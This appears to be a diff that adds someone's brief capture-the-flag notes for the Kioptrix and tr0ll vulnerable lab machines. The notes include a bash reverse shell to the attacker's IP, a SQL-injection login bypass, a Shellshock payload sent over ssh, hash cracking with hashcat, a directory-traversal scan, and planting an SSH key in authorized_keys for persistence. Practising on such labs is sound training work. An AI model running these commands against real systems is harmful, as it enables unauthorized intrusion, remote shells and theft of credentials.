@@ -1,0 +1,29 @@
+Kioptrix 1
+- to get a shell in ncat
+!!!!type in the existent shell: bash -i >& /dev/tcp/(your ip)/(port) 0>&1
+open an ncat listener to you machine
+got root!
+
+Kioptrix 2
+- simple sql injection = admin' or '1'-'1
+- privilege escallation
+	search nmap and other enumerations for useful info (os, kernel)
+	search the right exploit and then go to the /tmp to have rights to run it
+	python -c 'import pty;pty.spawn("/bin/sh")' - a more interactive shell
+	some simple mysql: show databases; USE mysql; select * from (database);
+	
+Kioptrix 3
+- hashcat -m 0 --force (txt file) (wordlist) - crack the hashes 
+ KIoptrix 5
+- perl dotdotpwn.pl -m http-url -u http://192.168.1.159/pChart2.1.3/examples/index.php?Action=View\&Script=/TRAVERSAL -k "root:" -o unix 
+- search for directory traversal (that tells the script to look for responce with root column)
+	
+tr0ll 1
+- tcpdump -nnttttAr lol.pcap - for reading .pcap files
+
+tr0ll 2
+- ssh -i noob noob@ip '() { :;}; /bin/bash' - type ssh with -v first to see if there is a forced command
+- generate public key with the private key you found 
+- cat is_rsa.pub and copy it to the vm to gain full shell (.ssh/authorized_keys)
+- and connect again with our authorized keys
+- check the notes_8.txt
